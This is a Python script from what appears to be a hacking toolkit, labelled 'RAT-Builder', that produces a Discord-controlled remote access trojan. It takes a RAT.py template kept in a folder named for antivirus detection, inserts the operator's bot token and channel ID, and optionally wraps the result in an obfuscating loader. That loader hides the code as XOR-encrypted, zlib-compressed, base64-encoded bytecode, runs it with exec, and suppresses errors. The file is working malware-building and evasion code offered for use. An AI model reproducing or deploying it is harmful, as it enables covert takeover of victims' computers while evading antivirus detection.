from Config.Config import *
from Config.Util import *
from Config.Translates import *
import os
import re
import marshal
import base64
import pyzipper
import time

current_language = LANGUAGE

# Définition d'une bannière pour RAT-Builder
rat_banner = f"""
   ██████╗  █████╗ ████████╗    ██████╗ ██╗   ██╗██╗██╗     ██████╗ ███████╗██████╗ 
   ██╔══██╗██╔══██╗╚══██╔══╝    ██╔══██╗██║   ██║██║██║     ██╔══██╗██╔════╝██╔══██╗
   ██████╔╝███████║   ██║       ██████╔╝██║   ██║██║██║     ██║  ██║█████╗  ██████╔╝
   ██╔══██╗██╔══██║   ██║       ██╔══██╗██║   ██║██║██║     ██║  ██║██╔══╝  ██╔══██╗
   ██║  ██║██║  ██║   ██║       ██████╔╝╚██████╔╝██║███████╗██████╔╝███████╗██║  ██║
   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                     
"""

# Affichage de la bannière
Slow(rat_banner)

def tr(key):
    return translations[current_language].get(key, key)

def encode_chunk(chunk):
    return base64.b64encode(chunk).decode('ascii')

def decode_chunk(encoded_chunk):
    return base64.b64decode(encoded_chunk.encode('ascii'))

def generate_random_name(length=8):
    import random
    import string
    chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(length))

def generate_junk_code(num_lines=5):
    import random
    junk_code = []
    operations = [
        "x = [i for i in range({0}, {1})]",
        "y = {{{0}: '{1}', {2}: '{3}'}}",
        "z = lambda a, b: a * b + {0}",
        "class {0}: pass",
        "def {0}(): return '{1}'",
        "try:\n        {0}\n    except:\n        pass",
        "{0} = bytes([{1}, {2}, {3}, {4}])",
        "{0} = [{1}, {2}, {3}] + [{4}, {5}, {6}]",
        "{0} = {1}.{2}({3})",
        "if {0} > {1}:\n        {2}\n    else:\n        {3}"
    ]
    
    for _ in range(num_lines):
        op = random.choice(operations)
        if "{0}" in op:
            op = op.format(
                random.randint(1, 1000),
                random.randint(1, 1000),
                random.randint(1, 1000),
                random.randint(1, 1000),
                random.randint(1, 1000),
                random.randint(1, 1000),
                random.randint(1, 1000)
            )
        junk_code.append("    " + op)
    
    return "\n".join(junk_code)

def xor_encrypt(data, key):
    import itertools
    return bytes(a ^ b for a, b in zip(data, itertools.cycle(key.encode())))

def obfuscate_code(source_code, chunk_size=100):
    import random
    import zlib
    import binascii
    
    # Générer des noms de variables aléatoires
    class_name = generate_random_name(random.randint(5, 10))
    decode_func = generate_random_name(random.randint(5, 10))
    exec_func = generate_random_name(random.randint(5, 10))
    loader_var = generate_random_name(random.randint(5, 10))
    xor_key = generate_random_name(8)
    
    # Version simplifiée qui fonctionne de manière fiable
    obfuscated_code = f"""# Coded by YourCrack
import base64
import zlib
import marshal
import time
import os
import sys
import itertools

class {class_name}:
    _key = "{xor_key}"
    
    @staticmethod
    def {decode_func}(data, key):
        return bytes(a ^ b for a, b in zip(data, itertools.cycle(key.encode())))
    
    @classmethod
    def {exec_func}(cls):
        # Données encodées
        encoded_data = "{base64.b64encode(xor_encrypt(zlib.compress(marshal.dumps(compile(source_code, '<string>', 'exec'))), xor_key)).decode('ascii')}"
        
        # Décodage et exécution
        data = base64.b64decode(encoded_data)
        data = cls.{decode_func}(data, cls._key)
        data = zlib.decompress(data)
        exec(marshal.loads(data))

if __name__ == "__main__":
    try:
        {class_name}.{exec_func}()
    except Exception as e:
        # Silencieux en cas d'erreur
        pass
"""

    return obfuscated_code

def main():
    # Vérifier l'existence du fichier RAT.py
    output_dir = os.path.join(tool_path, "Program", "FileDetectedByAntivirus")
    source_file = os.path.join(output_dir, "RAT.py")
    
    if not os.path.exists(source_file):
        print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Fichier RAT.py introuvable dans {output_dir}")
        Continue()
        Reset()
        return

    token = input(f"\n{INPUT} {tr('TokenBot')} -> {reset}")
    channel_id = input(f"\n{INPUT} {tr('ChannelIDRAT')} -> {reset}")
    output_filename = input(f"\n{INPUT} {tr('FileName')} -> {reset}")
    output_filename += '.py'

    with open(source_file, 'r', encoding='utf-8') as file:
        file_content = file.read()

    file_content = re.sub(r"TOKEN\s*=\s*'.*'", f"TOKEN = '{token}'", file_content)
    file_content = re.sub(r"CHANNEL_ID\s*=\s*['\"]?.*['\"]?", f"CHANNEL_ID = {channel_id}", file_content)

    if "intents = discord.Intents.default()" not in file_content:
        file_content = file_content.replace("intents.message_content = True", "intents = discord.Intents.default()\nintents.message_content = True")

    output_dir = os.path.join(tool_path, '1-Output/Rat/')
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, output_filename)

    with open(output_file, 'w', encoding='utf-8') as file:
        file.write(file_content)

    print(f"\n{INFO} {tr('RatSucces')} {reset}{output_file}{reset} \n")

    obfuscate = input(f"{INPUT} {tr('ObfY')} ").strip().lower()

    if obfuscate in ['y', 'Y', 'Yes', 'yes', 'YES', 'o', 'O', 'Oui', 'oui', 'OUI']:
        with open(output_file, 'r', encoding='utf-8') as f:
            source_code = f.read()

        obfuscated_code = obfuscate_code(source_code)

        obfuscated_file_name = f"obf_{output_filename}"
        obfuscated_file_path = os.path.join(output_dir, obfuscated_file_name)

        with open(obfuscated_file_path, 'w', encoding='utf-8') as f:
            f.write(obfuscated_code)

        print(f"\n{INFO} {tr('ObfSucces')} {reset}{obfuscated_file_path}\n")

    Continue()
    Reset()

if __name__ == "__main__":
    main()

